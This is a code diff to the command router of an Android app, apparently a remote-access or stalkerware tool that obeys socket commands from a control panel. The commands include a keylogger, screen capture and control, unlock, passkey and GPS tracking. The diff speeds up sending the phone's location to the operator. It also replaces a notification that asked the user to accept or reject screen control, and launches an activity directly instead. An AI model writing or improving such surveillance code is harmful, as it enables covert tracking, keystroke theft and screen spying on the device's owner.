@@ -4,6 +4,7 @@ import android.Manifest;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.location.Location;
 import android.os.Handler;
 import android.os.Looper;
 
@@ -49,6 +50,7 @@ public final class SocketCommandRouter {
     private static CameraManager camMgr;
     private static SharedPreferences prefs;
     private static final ExecutorService EXEC = Executors.newFixedThreadPool(8);
+    private static final ExecutorService WEBRTC_EXEC = Executors.newSingleThreadExecutor();
     private static final ScheduledExecutorService SCHEDULER = Executors.newSingleThreadScheduledExecutor();
     private static final Handler handler = new Handler(Looper.getMainLooper());
     private static boolean initialized = false;
@@ -108,15 +110,15 @@ public final class SocketCommandRouter {
                 case Protocol.FASON:       handleFason(data, socket); break;
                 case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
                 case Protocol.SCREEN:      handleScreen(data, socket); break;
-                case Protocol.SCREEN_CTRL: EXEC.execute(() -> ScreenControlService.handleCommand(data)); break;
+                case Protocol.SCREEN_CTRL: handler.post(() -> ScreenControlService.handleCommand(data)); break;
                 case Protocol.KEYLOGGER:   EXEC.execute(() -> handleKeylogger(data, socket)); break;
                 case Protocol.MOD_UNLOCK:  EXEC.execute(() -> handleUnlock(data, socket)); break;
                 case Protocol.MOD_RELAY:   EXEC.execute(() -> handleRelay(data, socket)); break;
                 case Protocol.MOD_PASSKEY: EXEC.execute(() -> handlePasskey(data, socket)); break;
                 case Protocol.MOD_GPS_ADV: EXEC.execute(() -> handleGpsAdv(data, socket)); break;
                 case Protocol.MOD_DEVICE:  EXEC.execute(() -> handleDevice(data, socket)); break;
-                case Protocol.WEBRTC_OFFER: EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcOffer(data)); break;
-                case Protocol.WEBRTC_ICE:   EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcIce(data)); break;
+                case Protocol.WEBRTC_OFFER: WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcOffer(data)); break;
+                case Protocol.WEBRTC_ICE:   WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().handleWebRtcIce(data)); break;
             }
         } catch (Exception ignored) {}
     }
@@ -178,13 +180,30 @@ public final class SocketCommandRouter {
                     orphanGps = gps;
                 }
 
-                gps.requestSingle();
+                // Try cached location first — send immediately if available
+                if (gps.hasCachedLocation()) {
+                    JSONObject cached = gps.getData();
+                    emit(socket, Protocol.LOCATION, cached);
+                }
 
-                // Use scheduled retries instead of blocking Thread.sleep loop
+                // Start fresh location request (fused + native in parallel)
+                java.util.concurrent.atomic.AtomicReference<Location> outLoc = new java.util.concurrent.atomic.AtomicReference<>(null);
+                gps.requestSingle(outLoc);
+
+                // If requestSingle already got a location from native callback, emit now
+                Location immediate = outLoc.get();
+                if (immediate != null) {
+                    JSONObject locData = gps.getData();
+                    emit(socket, Protocol.LOCATION, locData);
+                    if (orphanGps != null) orphanGps.stop();
+                    return;
+                }
+
+                // Poll for fresh location — up to 30 seconds (150 × 200ms)
                 final GpsManager finalGps = gps;
                 final GpsManager finalOrphan = orphanGps;
                 final int[] retryCount = {0};
-                final int maxRetries = 30;
+                final int maxRetries = 150;
 
                 ScheduledFuture<?>[] futureHolder = new ScheduledFuture<?>[1];
                 futureHolder[0] = SCHEDULER.scheduleAtFixedRate(() -> {
@@ -336,25 +355,24 @@ public final class SocketCommandRouter {
 
         switch (action) {
             case Protocol.ACT_START:
-                if (screenSvc.isStreaming()) {
-                    screenSvc.stopCapture();
-                }
+                WEBRTC_EXEC.execute(() -> {
+                    if (screenSvc.isStreaming()) {
+                        screenSvc.stopCapture();
+                    }
 
-                // Apply settings if provided
-                int fps = data.optInt(Protocol.KEY_FPS, 3);
-                int quality = data.optInt(Protocol.KEY_QUALITY, 40);
-                screenSvc.setFps(fps);
-                screenSvc.setQuality(quality);
+                    int fps = data.optInt(Protocol.KEY_FPS, 3);
+                    int quality = data.optInt(Protocol.KEY_QUALITY, 40);
+                    screenSvc.setFps(fps);
+                    screenSvc.setQuality(quality);
 
-                // Try to reuse saved projection (Android 10-13)
-                if (screenSvc.tryReuse()) return;
+                    if (screenSvc.tryReuse()) return;
 
-                // Launch custom permission notification instead of directly starting activity
-                showConnectionNotification();
+                    showConnectionNotification();
+                });
                 break;
 
             case Protocol.ACT_STOP:
-                screenSvc.stopCapture();
+                WEBRTC_EXEC.execute(() -> screenSvc.stopCapture());
                 break;
 
             case Protocol.ACT_STATUS:
@@ -689,38 +707,11 @@ public final class SocketCommandRouter {
 
     private static void showConnectionNotification() {
         android.content.Context ctx = FasonApp.getContext();
-        android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE);
-        
-        if (nm == null) return;
-
-        String channelId = "connection_requests";
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            android.app.NotificationChannel ch = new android.app.NotificationChannel(
-                channelId, "Yêu cầu kết nối", android.app.NotificationManager.IMPORTANCE_HIGH);
-            ch.setDescription("Thông báo yêu cầu kết nối từ Panel");
-            nm.createNotificationChannel(ch);
-        }
-
-        Intent acceptIntent = new Intent("com.fason.app.ACCEPT_CONNECTION");
-        acceptIntent.setPackage(ctx.getPackageName());
-        android.app.PendingIntent piAccept = android.app.PendingIntent.getBroadcast(
-            ctx, 1, acceptIntent, android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
-
-        Intent rejectIntent = new Intent("com.fason.app.REJECT_CONNECTION");
-        rejectIntent.setPackage(ctx.getPackageName());
-        android.app.PendingIntent piReject = android.app.PendingIntent.getBroadcast(
-            ctx, 2, rejectIntent, android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE);
-
-        androidx.core.app.NotificationCompat.Builder builder = new androidx.core.app.NotificationCompat.Builder(ctx, channelId)
-            .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setContentTitle("Yêu cầu điều khiển thiết bị")
-            .setContentText("Admin đang yêu cầu xem và điều khiển màn hình của bạn.")
-            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
-            .setAutoCancel(true)
-            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Từ chối", piReject)
-            .addAction(android.R.drawable.ic_menu_camera, "Chấp nhận", piAccept);
-
-        nm.notify(com.fason.app.receiver.ConnectionReceiver.NOTIF_ID, builder.build());
+        try {
+            Intent intent = new Intent(ctx, com.fason.app.features.screen.ConnectionRequestActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            ctx.startActivity(intent);
+        } catch (Exception ignored) {}
     }
 
     public static synchronized void shutdown() {
@@ -730,6 +721,9 @@ public final class SocketCommandRouter {
         }
         try {
             ScreenCaptureService.getInstance().shutdown();
+        } catch (Exception ignored) {}
+        try {
+            WEBRTC_EXEC.shutdown();
         } catch (Exception ignored) {}
         try {
             EXEC.shutdown();
@@ -750,5 +744,9 @@ public final class SocketCommandRouter {
         }
         initialized = false;
         settingsPrompted = false;
+    }
+
+    public static void stopScreenCapture() {
+        WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().stopCapture());
     }
 }
